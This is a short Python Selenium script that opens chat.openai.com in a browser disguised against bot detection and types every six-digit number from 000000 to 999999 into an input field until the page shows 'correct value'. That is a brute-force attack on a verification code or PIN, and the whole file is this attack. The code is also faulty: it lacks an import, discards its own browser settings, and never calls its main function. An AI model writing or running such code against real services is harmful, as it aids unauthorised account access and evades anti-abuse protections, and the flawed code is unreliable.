from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By



# Create a new ChromeOptions object
options = Options()

# Add the argument to run Chrome in headless mode
options.add_argument('--headless')

# Add the argument to use a fake user agent
options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')

# Add the argument to disable images loading
options.add_argument('blink-settings=imagesEnabled=false')

# Set the window size to 1920x1080
options.add_argument('--window-size=1920,1080')

# Set the maximum time to wait for a page to load
options.page_load_strategy = 'eager'

# Create a new Chrome webdriver with the options
driver = webdriver.Chrome(options=options)

driver = uc.Chrome()



driver.get("https://chat.openai.com/") # Replace with the URL of the page you want to automate



def Start():
    input_tag = driver.find_element(By.TAG_NAME, 'input')
     # Locate the input tag with the class "text-input text-input-lg text-input-full"

    for i in range(1000000): # Loop through numbers 000000 to 999999
        input_tag.clear() # Clear the input tag before entering a new value
        input_tag.send_keys(f"{i:06d}") # Format the number with leading zeros and enter it into the input tag
        time.sleep(1)
        #input_tag.send_keys(Keys.ENTER) # Press the ENTER key to submit the form

        if driver.page_source.find("correct value") != -1: # Check if the page contains the "correct value" message
            print(f"Found correct value: {i:06d}")
            break


